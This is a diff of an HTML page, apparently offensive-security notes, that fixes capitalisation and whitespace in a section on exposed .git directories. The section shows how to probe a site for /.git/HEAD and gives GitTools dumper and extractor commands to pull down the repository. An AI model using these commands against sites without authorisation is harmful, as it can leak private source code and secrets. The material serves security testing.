@@ -231,13 +231,13 @@
           <div class="section">
             
               <h1 id="git">Git</h1>
-<p>Some website exposes <code>.git</code> to the internet. To check if the website is vulnerable, then check for
+<p>Some website exposes <code>.git</code> to the Internet. To check if the website is vulnerable, then check for
 the following path:</p>
 <pre><code>https://&lt;domain&gt;/some/path/.git/HEAD
 </code></pre>
 
 <p>If the server return a status 200, then it might be possible to clone the repository. For that, you
-can use (<code>GitTools</code>)[https://github.com/internetwache/GitTools): </p>
+can use (<code>GitTools</code>)[https://github.com/internetwache/GitTools):</p>
 <pre><code>Dumper/gitdumper.sh http://&lt;domain&gt;/some/path/.git/ ~/&lt;domain&gt;
 Extractor/extractor.sh ~/&lt;domain&gt; ~/&lt;domain&gt;_dump
 </code></pre>
